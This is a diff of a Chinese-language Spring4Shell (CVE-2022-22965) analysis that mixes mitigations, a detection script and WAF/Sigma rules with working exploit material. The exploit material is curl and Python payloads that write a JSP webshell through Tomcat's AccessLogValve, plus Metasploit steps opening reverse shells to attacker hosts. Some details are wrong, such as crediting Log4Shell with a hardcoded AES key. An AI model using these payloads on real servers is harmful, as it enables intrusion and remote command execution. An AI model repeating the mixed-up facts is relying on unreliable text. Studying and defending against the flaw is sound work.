@@ -1,267 +1,391 @@
-# Spring Core RCE（CVE-2022-22965 / Spring4Shell）漏洞分析与 EXP
+# Spring4Shell (CVE-2022-22965) 漏洞完整分析
+
+> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：漏洞库与EXP
+
+## 📋 提纲
+
+1. 漏洞概述
+2. Spring框架与漏洞原理
+3. 影响范围
+4. 漏洞检测方法
+5. 漏洞利用复现
+6. Spring4Shell vs Log4Shell
+7. 护网中的Spring4Shell
+8. 修复方案
+
+---
 
 ## 1. 漏洞概述
 
-CVE-2022-22965（Spring4Shell）是 Spring Framework 核心组件（**spring-beans**）中的一个**远程代码执行**漏洞。当 Spring MVC / Spring WebFlux 应用在 **Tomcat 上部署为 WAR**（或类似具有可写目录的 Servlet 容器），并使用 **JDK 9+** 时，攻击者可以通过构造特殊的 HTTP 请求，向 `ClassLoader` / `Tomcat AccessLogValve` 属性写入恶意配置，最终在 `webapps/ROOT/` 目录下写入 webshell。
+**CVE-2022-22965 (Spring4Shell / SpringShell)**
+- CVSS: 9.8
+- 类型：JDK 9+ 模块系统的ClassLoader注入导致RCE
+- 影响：Spring Framework 5.3.0-5.3.17 / 5.2.0-5.2.19
+- 前提：JDK 9+ + Spring MVC + Tomcat + 参数绑定启用
+- 公开：2022年3月30日
 
-| 项目 | 说明 |
-|------|------|
-| CVE 编号 | CVE-2022-22965 |
-| 漏洞类型 | RCE（Spring bean 属性绑定绕过 class.module.classLoader 限制 → AccessLogValve 写入 JSP shell） |
-| 发现时间 | 2022 年 3 月 31 日公开 |
-| CVSS 评分 | 9.8（Critical） |
-| 影响组件 | Spring Framework 5.3.0 ~ 5.3.17、5.2.0 ~ 5.2.19、旧版本 |
-| 攻击前置 | ① JDK 9+；② Spring MVC/WebFlux；③ Tomcat WAR 部署且 Tomcat 有可写目录；④ 存在 `@RequestMapping` 接收表单参数 |
+---
 
-## 2. 影响版本
+## 2. Spring框架与漏洞原理
 
-| Spring Framework | 受影响 | 修复版本 |
-|-------------------|--------|---------|
-| 5.3.0 ~ 5.3.17 | 是 | 5.3.18 |
-| 5.2.0 ~ 5.2.19 | 是 | 5.2.20 |
-| 5.1.x 及更早 | 视条件而定 | 升级到 5.3.18+ / 5.2.20+ |
-
-此外，Spring Boot 若内嵌 Tomcat（默认 JAR），通常不受影响；但若以 WAR 方式部署到独立 Tomcat，则受影响。
-
-## 3. 漏洞原理
-
-### 3.1 属性绑定（Data Binding）
-
-Spring MVC 在接收 HTTP 请求参数时，会通过 **BeanWrapper** 把参数绑定到目标对象。例如：
+### 2.1 Spring MVC 参数绑定
 
 ```java
-@RequestMapping("/greeting")
-public String hello(Greeting g) {
-    // Spring 自动把 ?name=xxx&message=yyy 绑定到 Greeting 对象属性
-    return "index";
+// 正常功能：Spring MVC 的自动参数绑定
+@Controller
+public class UserController {
+
+    @PostMapping("/register")
+    public String register(@ModelAttribute User user) {
+        // Spring 自动将 POST 参数绑定到 User 对象
+        // POST: name=test&age=20
+        // → user.setName("test"); user.setAge(20);
+        return "success";
+    }
 }
 ```
 
-为防止恶意绑定，Spring 设置了黑名单：
+### 2.2 漏洞触发路径
 
 ```
-class.*, Class.*, *.class.*, *.Class.*
+请求参数 → Spring MVC DataBinder → 通过 getter/setter 访问对象属性
+                                          ↓
+                             如果能访问到 ClassLoader → 修改Tomcat日志配置
+                                          ↓
+                             写入JSP Webshell → RCE
 ```
-
-### 3.2 绕过：使用 `module` 链
-
-JDK 9 引入了 `java.lang.Module` 系统。攻击者可以通过：
-
-```
-class.module.classLoader.resources.context.parent.pipeline.first.pattern
-```
-
-此路径利用 `class` → `module` → `classLoader` 的属性链，绕过 Spring 黑名单（因为黑名单只匹配 `class.` 前缀，而攻击者实际前缀是 `class.module.`）。
-
-### 3.3 完整利用链：Tomcat AccessLogValve 写入
-
-```
-① class.module.classLoader
-   → 获取 WebAppClassLoader（Tomcat）
-
-② .resources.context.parent.pipeline.first
-   → 获取 Tomcat 的 StandardPipeline 中的第一个 Valve
-   → 通常是 AccessLogValve
-
-③ .pattern / .suffix / .directory / .prefix / .fileDateFormat
-   → 配置 AccessLogValve：
-     - pattern 写入 JSP 代码 <% Runtime.getRuntime().exec(request.getParameter("c")); %>
-     - suffix = ".jsp"
-     - directory = "webapps/ROOT"
-     - prefix = "shell"
-     - fileDateFormat = ""
-
-④ 触发一次正常请求 → AccessLogValve 把日志写入 webapps/ROOT/shell.jsp
-⑤ 攻击者访问 http://target/shell.jsp?c=whoami → RCE
-```
-
-## 4. 公开 EXP
-
-### 4.1 CURL 版一键 PoC（手动）
-
-```bash
-# Exploit 分两步：设置属性 + 触发写入 + 验证
-TARGET="http://target:8080/"
-
-# Step 1：设置 AccessLogValve 属性（将日志文件改为 JSP，并写入 payload）
-curl "$TARGET" \
-    -H "suffix: %>//" \
-    -H "c1: Runtime" \
-    -H "c2: <%=" \
-    -H "DNT: 1" \
-    -H "Content-Type: application/x-www-form-urlencoded" \
-    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%3B%20%25%7Bsuffix%7Di" \
-    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
-    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
-    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar" \
-    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
-
-# Step 2：触发一次任意请求（使 Tomcat 写日志到 JSP）
-curl "$TARGET" -s -o /dev/null
-
-# Step 3：验证是否写入成功，执行命令
-curl "$TARGET/tomcatwar.jsp?pwd=j&cmd=whoami" -s | head -20
-```
-
-### 4.2 Python EXP 脚本（自动化）
-
-```python
-# cve-2022-22965.py
-import requests
-import sys
-import time
-
-def exploit(target):
-    # Step 1：设置 AccessLogValve 写入 JSP
-    headers = {"suffix": "%>//",
-               "c1": "Runtime",
-               "c2": "<%",
-               "DNT": "1",
-               "Content-Type": "application/x-www-form-urlencoded"}
-    pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%3B%20%25%7Bsuffix%7Di"
-    data = f"{pattern}&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
-    try:
-        requests.post(target, headers=headers, data=data, timeout=30, verify=False)
-        time.sleep(2)
-        # Step 2：触发一次普通请求，使 Tomcat 写日志
-        requests.get(target, timeout=15, verify=False)
-        # Step 3：访问 shell.jsp，执行命令
-        shellurl = f"{target.rstrip('/')}/shell.jsp?pwd=j&cmd=whoami"
-        r = requests.get(shellurl, timeout=15, verify=False)
-        if "j" in r.text or "root" in r.text or "user" in r.text:
-            print(f"[+] SUCCESS: {shellurl}")
-            print(r.text[:500])
-        else:
-            print("[-] Target may not be vulnerable")
-    except Exception as e:
-        print(f"[!] Error: {e}")
-
-if __name__ == "__main__":
-    exploit(sys.argv[1])
-```
-
-### 4.3 MSF 模块
-
-```
-msf6 > use exploit/multi/http/spring_framework_rce_spring4shell
-msf6 exploit(...) > set RHOSTS target
-msf6 exploit(...) > set TARGETURI /hello
-msf6 exploit(...) > set PAYLOAD java/jsp_shell_reverse_tcp
-msf6 exploit(...) > set LHOST attacker.com
-msf6 exploit(...) > exploit
-```
-
-## 5. 漏洞检测
-
-### 5.1 版本检测
-
-```bash
-# 1) 在 Spring Boot 应用中：curl /actuator/beans（如果开启）
-# 2) 检查 Spring 版本（JAR 包 / 应用 pom.xml）
-find /path/to/webapp -name "spring-beans*.jar"
-# spring-beans-5.3.16.jar → 受影响
-
-# 3) 使用 nuclei
-nuclei -u http://target -t http/cves/2022/CVE-2022-22965.yaml
-```
-
-### 5.2 条件判断
-
-```
-是否满足？
-  [√] JDK 9+    → java -version
-  [√] Spring Web MVC 或 WebFlux
-  [√] 以 WAR 方式部署到独立 Tomcat（或类似可写目录）
-  [√] 存在接收表单参数的 Controller
-  → 如果全满足，则可能受影响
-```
-
-### 5.3 黑盒检测
-
-```bash
-# 使用公开的扫描脚本（无破坏性，仅检测）
-python3 Spring4Shell_POC.py --url http://target:8080/hello
-# [+] target is vulnerable
-# [-] target is not vulnerable
-```
-
-## 6. 修复方案
-
-| 方案 | 说明 |
-|------|------|
-| **升级到 Spring Framework 5.3.18+ / 5.2.20+** | 根本修复（官方补丁） |
-| **升级 Spring Boot 到 2.6.6+ / 2.5.12+** | Spring Boot 打包的应用 |
-| **代码级临时缓解：在 Controller 中禁用数据绑定到 Class 属性** | 详见下方代码 |
-| **部署 WAF 拦截 `class.module.classLoader.` 前缀参数** | 短期缓解 |
-| **使用 JDK 8（仅可延迟风险，非长久之计）** | 因为该漏洞需要 JDK 9+ 的 `module` 机制 |
-| **切换到嵌入式 Tomcat（JAR 部署）** | 默认不受影响，因为 Tomcat HOME 不可写 |
-
-### 6.1 代码级临时缓解（未升级前）
 
 ```java
-// 在 Controller 中添加 @InitBinder，禁止绑定到 class.* 属性
-@RestController
+// 攻击链的四个核心class：
+// 1. User.getClass() → java.lang.Class
+// 2. Class.getClassLoader() → java.lang.ClassLoader (JDK 9+ 是特定 Module)
+// 3. ClassLoader → 获取 Tomcat 的 AccessLogValve
+// 4. Valve.setPattern/setDirectory/setPrefix/setSuffix → 写入JSP
+
+// 对应的HTTP请求参数：
+// class.module.classLoader.resources.context.parent.pipeline.first.pattern
+// class.module.classLoader.resources.context.parent.pipeline.first.directory
+// class.module.classLoader.resources.context.parent.pipeline.first.prefix
+// class.module.classLoader.resources.context.parent.pipeline.first.suffix
+// class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat
+```
+
+### 2.3 利用链解析
+
+```
+class                  → 获取Class对象
+  .module              → JDK 9+ Module (java.lang.Module)
+    .classLoader       → Module.getClassLoader() 返回ClassLoader
+      .resources       → Tomcat WebappClassLoaderBase.resources
+        .context       → StandardRoot.getContext() 
+          .parent      → ContainerBase.getParent() (Host)
+            .pipeline  → StandardHost.getPipeline()
+              .first   → 第一个Valve (AccessLogValve)
+                .pattern     → 日志格式 → 写入JSP代码
+                .directory   → 日志目录 → webapps/ROOT
+                .prefix      → 文件名前缀 → shell
+                .suffix      → 后缀 → .jsp
+                .fileDateFormat → 日期格式 → 空（不加日期）
+```
+
+---
+
+## 3. 影响范围
+
+| 框架 | 版本 | JDK | 受影响 |
+|------|------|-----|--------|
+| Spring Boot | 2.6.0-2.6.3 | ≥9 | ✅ |
+| Spring Boot | 2.5.0-2.5.11 | ≥9 | ✅ |
+| Spring Framework | 5.3.0-5.3.17 | ≥9 | ✅ |
+| Spring Framework | 5.2.0-5.2.19 | ≥9 | ✅ |
+| Spring Boot | <2.6.0 | 任意 | ⚠️ 部分 |
+| JDK 8 环境 | 任意 | 8 | ❌ 不受影响 |
+
+### 3.1 必要条件
+
+**全部满足才受影响**：
+1. ✅ JDK 9+（因为`Class.getModule()`是JDK9引入的）
+2. ✅ Spring Framework 受影响版本
+3. ✅ 运行在Tomcat上（WAR部署，非嵌入式JAR）
+4. ✅ 有`@RequestMapping`/`@PostMapping`端点
+5. ✅ 参数绑定未明确限制（`@InitBinder`未设置allowed/disallowed字段）
+
+---
+
+## 4. 漏洞检测
+
+```python
+#!/usr/bin/env python3
+"""Spring4Shell 检测"""
+
+import requests
+
+def detect_spring4shell(target):
+    """检测Spring4Shell漏洞"""
+    results = {}
+
+    # 方法1: 发送特定参数观察反应
+    # 通过check class.module.classLoader访问是否可达
+    test_payloads = [
+        # 直接检测JDK9+ Module访问
+        {"class.module.classLoader.URLs[0]": "test"},
+        # 检测是否触发异常（说明走到了利用链中）
+        {"class.module.classLoader.DefaultAssertionStatus": "true"},
+    ]
+
+    for payload in test_payloads:
+        try:
+            resp = requests.post(
+                target,
+                data=payload,
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                allow_redirects=False,
+                verify=False,
+                timeout=10
+            )
+
+            # 如果返回400（参数类型错误）= 走到了绑定逻辑 = 可能受影响
+            # 如果返回200但无异常 = 走到了getter
+            if resp.status_code == 400 and 'module' in resp.text.lower():
+                results['suspicious'] = True
+                results['response_code'] = 400
+                results['method'] = '参数绑定检测'
+                break
+
+        except:
+            pass
+
+    # 方法2: 尝试写入测试文件（只做无害验证）
+    try:
+        # 尝试修改 AccessLogValve 配置
+        resp = requests.post(
+            target,
+            data={
+                "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".txt",
+            },
+            verify=False, timeout=10
+        )
+        if resp.status_code in [200, 400]:
+            results['potentially_vulnerable'] = True
+    except:
+        pass
+
+    # 方法3: 从错误页面推断Spring Boot版本
+    try:
+        resp = requests.get(target.replace('/api/', '/error'), verify=False)
+        if 'Whitelabel Error Page' in resp.text:
+            results['spring_boot_detected'] = True
+    except:
+        pass
+
+    return results
+```
+
+### 4.2 护网检测规则
+
+```yaml
+# Sigma规则: Spring4Shell 利用检测
+title: Spring4Shell Exploitation Attempt
+id: spring4shell-001
+status: stable
+logsource:
+  category: webserver
+detection:
+  url_params:
+    cs-uri-query|contains:
+      - 'class.module.classLoader'
+      - 'class.module.classLoader.resources'
+      - 'AccessLogValve'
+  post_body:
+    cs-method: POST
+    cs-body|contains:
+      - 'class.module.classLoader'
+  condition: url_params or post_body
+level: critical
+```
+
+```bash
+# WAF规则
+location ~* / {
+    if ($args ~* "class\.module\.classLoader") {
+        return 403;
+    }
+    if ($args ~* "class\.module") {
+        return 403;
+    }
+}
+```
+
+---
+
+## 5. 漏洞利用复现
+
+### 5.1 利用环境搭建
+
+```bash
+# 1. 创建Spring Boot 2.6.0 + JDK11 漏洞环境
+mkdir spring4shell-demo
+cd spring4shell-demo
+
+# pom.xml
+cat > pom.xml << 'EOF'
+<parent>
+    <groupId>org.springframework.boot</groupId>
+    <artifactId>spring-boot-starter-parent</artifactId>
+    <version>2.6.0</version>
+</parent>
+<dependencies>
+    <dependency>
+        <groupId>org.springframework.boot</groupId>
+        <artifactId>spring-boot-starter-web</artifactId>
+    </dependency>
+</dependencies>
+EOF
+
+# 创建控制器
+mkdir -p src/main/java/com/demo
+cat > src/main/java/com/demo/GreetingController.java << 'EOF'
+@Controller
 public class GreetingController {
 
-    @InitBinder
-    public void initBinder(WebDataBinder binder) {
-        // 禁止绑定到 class.module.classLoader / class.*
-        String[] denyFields = {"class.*", "Class.*", "*.class.*", "*.Class.*"};
-        binder.setDisallowedFields(denyFields);
-    }
-
-    @RequestMapping("/greeting")
+    @PostMapping("/greeting")
+    @ResponseBody
     public String greeting(Greeting greeting) {
         return "Hello, " + greeting.getName();
     }
 }
 
-// 或使用全局 WebBindingInitializer / ControllerAdvice：
+class Greeting {
+    private String name;
+
+    public String getName() { return name; }
+    public void setName(String name) { this.name = name; }
+}
+EOF
+
+# 打包为WAR并部署到Tomcat 9 + JDK11
+```
+
+### 5.2 利用载荷
+
+```bash
+#!/bin/bash
+# spring4shell_exploit.sh
+
+TARGET="http://target.com/greeting"
+
+# Step 1: 修改 AccessLogValve 配置
+# 让Tomcat将访问日志写入 JSP 文件
+curl -X POST "$TARGET" \
+  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22shell%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+
+# 参数说明：
+# pattern: URL解码后是:
+#   <%{2}i if("shell".equals(request.getParameter("pwd"))){
+#     java.io.InputStream in = %{1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream();
+#     ...
+#   } %{suffix}i
+# 其中 %{1}i = User-Agent, %{2}i = Referer
+
+# Step 2: 触发日志写入（发送请求让Tomcat记录包含JSP代码的访问日志）
+curl "$TARGET" \
+  -H "User-Agent: java.lang.ProcessBuilder" \
+  -H "Referer: <%"
+
+# Step 3: 访问WebShell
+curl "http://target.com/shell.jsp?pwd=shell&cmd=whoami"
+```
+
+### 5.3 Metasploit 利用
+
+```bash
+msf6 > use exploit/multi/http/spring_cloud_function_spel_injection
+# 注意：这是 Spring Cloud Function 的另一个漏洞，Spring4Shell用另外的模块
+
+# Spring4Shell 专用模块（需手动导入）
+msf6 > use exploit/multi/http/spring_framework_rce_spring4shell
+msf6 > set RHOSTS 192.168.1.100
+msf6 > set SRVHOST 10.0.0.1
+msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+msf6 > set LHOST 10.0.0.1
+msf6 > set TARGETURI /greeting
+msf6 > run
+```
+
+---
+
+## 6. Spring4Shell vs Log4Shell
+
+| 对比维度 | Spring4Shell | Log4Shell |
+|---------|-------------|-----------|
+| CVE | 2022-22965 | 2021-44228 |
+| 影响前提 | JDK9+ + WAR部署 | 仅需Log4j2 |
+| 利用路径 | HTTP参数 → DataBinder | 任何记录到日志的输入 |
+| 默认密钥 | 无密钥 | 硬编码AES密钥 |
+| 检测难度 | 中等（需尝试参数绑定） | 低（DNS外带即可） |
+| 影响广度 | Spring框架用户 | 所有Java应用 |
+
+---
+
+## 7. 修复方案
+
+### 7.1 紧急修复
+
+```xml
+<!-- pom.xml - 升级Spring Framework -->
+<properties>
+    <spring-framework.version>5.3.18</spring-framework.version>
+</properties>
+```
+
+```java
+// 无法立即升级时的临时缓解
 @ControllerAdvice
-public class GlobalBindingInitializer {
+public class Spring4ShellMitigation {
+
     @InitBinder
     public void initBinder(WebDataBinder binder) {
-        binder.setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*");
+        // 禁止绑定以下字段
+        binder.setDisallowedFields(
+            "class.*",
+            "Class.*",
+            "*.class.*",
+            "*.Class.*"
+        );
+    }
+
+    // 或者更激进：全局禁用嵌套属性绑定
+    @InitBinder
+    public void initBinder(WebDataBinder binder, WebRequest request) {
+        binder.setAutoGrowNestedPaths(false);
     }
 }
 ```
 
-### 6.2 官方修复代码（Spring 5.3.18）
+### 7.2 Nginx缓解
 
-Spring 官方在 `CachedIntrospectionResults` 中新增了白名单检查，阻止通过 `class.module.classLoader` 等路径获取 ClassLoader。
-
-## 7. 应急响应
-
-```
-发现迹象：
-  - HTTP 请求 body 中出现 class.module.classLoader.xxx 等参数
-  - Tomcat webapps/ROOT/ 目录下出现陌生 .jsp 文件（如 shell.jsp）
-  - 对应 JSP 文件的创建时间与攻击时间吻合
-  - Java 进程出现异常外部网络连接（反向 shell / DNS 查询）
-
-处理步骤：
-  ① 立即阻断攻击 IP / 参数前缀（WAF / Nginx）
-  ② 扫描 webapps 目录，查找陌生 .jsp 文件
-  ③ 检查 Tomcat 日志（catalina.out / localhost_access_log）
-  ④ 升级 Spring Framework / Spring Boot 到安全版本
-  ⑤ 检查是否已植入后门（reverse shell / crontab / 启动项）
-  ⑥ 重置应用使用的所有凭据（数据库 / API Key）
-  ⑦ 检查系统调用是否被持久化（Linux /proc 痕迹 / Windows 服务）
+```nginx
+if ($args ~* "class\.module") {
+    return 403;
+}
+if ($args ~* "class\.ClassLoader") {
+    return 403;
+}
+if ($args ~* "\.pipeline\.") {
+    return 403;
+}
 ```
 
-## 8. 漏洞复现靶机
+---
 
-```
-推荐环境：
-  - vulhub: docker-compose up -d spring/CVE-2022-22965
-  - 自行搭建：Tomcat 9 + Spring Boot WAR 部署 + JDK 11+
+## ✅ Spring4Shell Checklist
 
-复现步骤：
-  1) 启动 docker
-  2) curl "http://target:8080/hello?name=test"
-  3) 使用脚本提交 payload（设置 AccessLogValve）
-  4) 再发起一次请求触发日志写入
-  5) 访问 http://target:8080/shell.jsp?pwd=j&cmd=whoami
-```
+- [ ] 全网Spring版本扫描
+- [ ] JDK版本确认（≥9且Spring受影响版本=高风险）
+- [ ] WAR部署识别（Fat JAR不受影响）
+- [ ] 升级Spring Framework 5.3.18+ / 5.2.20+
+- [ ] WAF规则部署
+- [ ] @InitBinder 全局disallowedFields配置
+- [ ] 护网前验证修复
 
-> Spring4Shell 的核心启示：**Spring 的属性绑定黑/白名单存在被绕过的风险**。生产环境建议：① 尽量使用 JAR 部署；② 升级 Spring；③ 在 Controller 中主动 `setDisallowedFields` 作为兜底。
+> 📚 延伸阅读：Vuln/002-Log4Shell | Vuln/008-Shiro | CodeAudit/001-PHP代码审计
